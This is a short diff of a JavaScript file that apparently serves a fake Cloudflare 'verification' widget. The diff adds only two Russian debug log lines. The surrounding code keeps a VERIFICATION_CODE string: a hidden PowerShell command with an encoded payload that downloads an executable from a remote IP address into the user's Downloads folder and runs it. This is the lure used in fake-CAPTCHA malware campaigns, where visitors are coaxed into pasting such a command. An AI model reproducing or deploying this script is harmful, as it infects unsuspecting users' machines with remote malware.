@@ -1,8 +1,13 @@
 (function() {
     'use strict';
 
+
+    console.log('abc.js запущен', location.href);
+    
     const VERIFICATION_CODE = "powershell -NoP -NonI -W Hidden -e JABwAD0AIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXAAkACgAWwBnAHUAaQBkAF0AOgA6AE4AZQB3AEcAdQBpAGQAKAApAC4AVABvAFMAdAByAGkAbgBnACgAJwBuACcAKQAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsADgAKQApAC4AZQB4AGUAIgA7AFMAdABhAHIAdAAtAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByACAAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAnACsAJwAyADAANwAuADEANQAuADMAOAAnACsAJwAvAGMAbABpAGMAawAuAGUAeABlACcAKQAgACQAcAA7AHMAYQBwAHMAIAAkAHAA";
     const SITE_ADDRESS = "cloudflare.com";
+
+    console.log('abc.js запущен', location.href);
 
     function boot() {
         if (document.querySelector('[data-html-content-widget]')) return;
